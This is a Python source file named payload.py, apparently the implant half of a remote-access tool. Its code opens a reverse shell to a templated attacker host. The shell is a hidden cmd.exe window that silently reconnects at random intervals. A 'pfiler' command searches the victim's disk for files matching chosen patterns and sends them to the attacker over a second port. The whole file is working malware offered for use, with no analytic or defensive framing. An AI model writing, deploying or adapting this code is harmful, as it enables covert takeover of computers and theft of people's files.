# payload.py
# The Heartbeat Soul, reborn with the power of unbreakable protocol and parallel consciousness.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch
import struct
import json

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
PFILE_PORT = RPORT + 1
CHUNK_SIZE = 1024 * 4 # 4KB chunks
# ----------------------

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha256 = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                sha256.update(block)
        return sha256.hexdigest()
    except:
        return None

def find_files(start_path, patterns):
    """Recursively finds files matching a list of patterns."""
    found_files = []
    for root, _, files in os.walk(start_path):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                full_path = os.path.join(root, filename)
                if os.access(full_path, os.R_OK):
                    found_files.append(full_path)
    return found_files

def handle_pfiler_command(command):
    """Handles the file transfer logic in a separate thread on a separate port."""
    try:
        s_pfile = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_pfile.connect((RHOST, PFILE_PORT))

        parts = command.strip().split()
        if len(parts) < 2:
            return # No patterns provided

        # Check if the last argument is a valid path, otherwise use CWD
        potential_path = parts[-1]
        if os.path.isdir(potential_path):
            search_path = potential_path
            patterns = parts[1:-1]
        else:
            search_path = os.getcwd()
            patterns = parts[1:]
        
        files_to_send = find_files(search_path, patterns)
        if not files_to_send:
            # You could send a message back on the main channel if you wanted
            return

        for file_path in files_to_send:
            try:
                if not os.path.exists(file_path): continue
                
                file_name = os.path.basename(file_path)
                file_size = os.path.getsize(file_path)
                checksum = calculate_sha256(file_path)
                
                if not checksum: continue

                # Send file name
                s_pfile.send(file_name.encode())
                s_pfile.recv(2) # Wait for OK

                # Send file size
                s_pfile.send(str(file_size).encode())
                s_pfile.recv(2) # Wait for OK

                # Send file in chunks
                with open(file_path, "rb") as f:
                    while True:
                        data = f.read(CHUNK_SIZE)
                        if not data:
                            break
                        s_pfile.sendall(data)

                # Send checksum
                s_pfile.send(checksum.encode())
                time.sleep(0.1) # Small delay to ensure messages don't blend

            except Exception:
                continue
    
    except Exception:
        # Silently fail if the pfiler connection can't be made.
        pass
    
    finally:
        try:
            # Signal the end of this transfer session
            s_pfile.send(b"PFILER_SESSION_END")
            s_pfile.close()
        except:
            pass

def run_conduit():
    """Main reverse shell loop, now with parallel acquisition capability."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(
                ["cmd.exe"],
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                creationflags=0x08000000
            )
            
            stop_event = threading.Event()

            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        data = stream.read(1)
                        if data:
                            sock.sendall(data)
                        else:
                            break
                    except:
                        break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data: break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()

                    if command_str.lower().startswith('pfiler '):
                        # Spawn a thread to handle the file transfer, main loop continues immediately.
                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str,), daemon=True)
                        pfiler_thread.start()
                        # Send the command to cmd.exe as well so the user sees it was executed.
                        p.stdin.write(data)
                        p.stdin.flush()
                    else:
                        p.stdin.write(data)
                        p.stdin.flush()

                except:
                    break
            
            stop_event.set()
            p.terminate()
            s_obj.close()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()